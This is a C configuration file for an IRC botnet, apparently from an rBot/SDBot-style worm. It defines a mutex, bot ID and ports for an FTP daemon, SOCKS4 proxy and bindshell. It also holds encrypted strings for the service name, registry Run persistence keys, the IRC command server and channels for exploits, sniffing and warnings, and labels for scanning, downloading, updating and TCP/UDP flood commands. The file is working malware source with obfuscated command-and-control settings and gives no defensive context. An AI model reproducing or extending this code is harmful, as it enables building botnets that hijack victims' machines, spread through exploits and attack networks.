
char mutexhandle[]		= "dde me evd bdd";//*mutex handle

#ifndef _DEBUG
char botid[]			= "0.33";				//*bot id
#else
char botid[]			= "debug";
#endif

unsigned short ftpdport	= 8082;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 8069;					// socks4 port
unsigned short redirport= 8060;					// redirect local port
unsigned short bindport = 4460;					//*bindshell port most of the exploits use

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\rlog.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------

	char filename[]			= "\x45\x40\x9D\x57\x55\x87\xAF\x34";

#ifndef NO_FCONNECT
	char cononstart[]		= "\x4C\x58\x8E\x54\x41\xCD\xF8\x26\xF4\x62\x1A\xC5\x59\x77\xDA\xB8\xDB\x8E\x72\xC2\x83\xB3\xE5\x24\xBF\x3A\xA8\x9E\x9E\x65\x3F\xFF\x99\xB2\x9B";
#endif

	char version[]			= "\x47\x4D\x94\x4A\x02\xD3";

#ifndef NO_SERVICE
	char servicename[]		= "\x45\x40\x9D\x57";
	char servicedisplayname[]= "\x68\x43\x99\x45\x17\xC2\x99\x34\xE9\x7B\x11\xD8\x45\x24\xFC\xAD\xCD\x99\x6F\xC4\xC8";
	char servicedesc[]		= "\x68\x43\x99\x45\x17\xC2\x99\x34\xE9\x7B\x11\xD8\x45\x24\xFC\xAD\xCD\x99\x6F\xC4\xC8";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", "\x65\x60\xBD\x77" };
#endif

	char password[]			= "\x53\x49\x9B\x54\x14\x8C\xAF";
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char authhost2[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char authhost3[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char *authost[] = { authhost1, authhost2, authhost3 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\x49\x65\xA8\x67\x5B\x94\xE1\x7F\xAC\x38\x5E\xE1\x46\x65\xC3\xAD\xDB\xCF\x4B\xC6\xDF\xBA\xED\x2A\xE0\x17\xBE\x88";
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{
			"\x15\x1E\xCD\x0A\x4B\xCC\xE7\x7F\xAC",//server
			"",//pass
			6667,//port
			FALSE,//ssl
			"\x07\x54",//mainchan
			"\x56",//key
			"",//modeonconn
			"",//modeonjoin
			"\x07\x49\x82\x54",//exploitchan - #exp
			"\x07\x5F\x94\x4D\x1D\x84",//sniffchan - #sniff
			"\x07\x5B\x9B\x56\x15"//warnchan - #warn
		},
	};

#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x65\x60\xBD\x69" };
#endif

char main_title[]		= "REP//";
char threads_title[]	= "T//";
char process_title[]	= "P//";
char irc_title[]		= "I//";
char sec_title[]		= "S//";
char unsec_title[]		= "UNS//";
char scan_title[]		= "SC//";
char ftp_title[]		= "EFTP//";
char file_title[]		= "FILE//";
char download_title[]	= "DOWN//";
char update_title[]		= "UPD//";
char logic_title[]		= "LO//";
char mirc_title[]		= "M//";
char reg_title[]		= "RE//";
//char pstore_title[]	= "PSTORE//";
char netstatp_title[]	= "NETS//";
//char sniffer_title[]	= "SNIFFER//";
char tcp_title[]		= "TC//";
char udp_title[]		= "UD//";
//char speedtest_title[]	= "SPEEDTEST//";
//char sock4_title[]		= "SOCKS4//";
//char redirect_title[]	= "REDIRECT//";
char warn_title[]		= "\2W\2//";
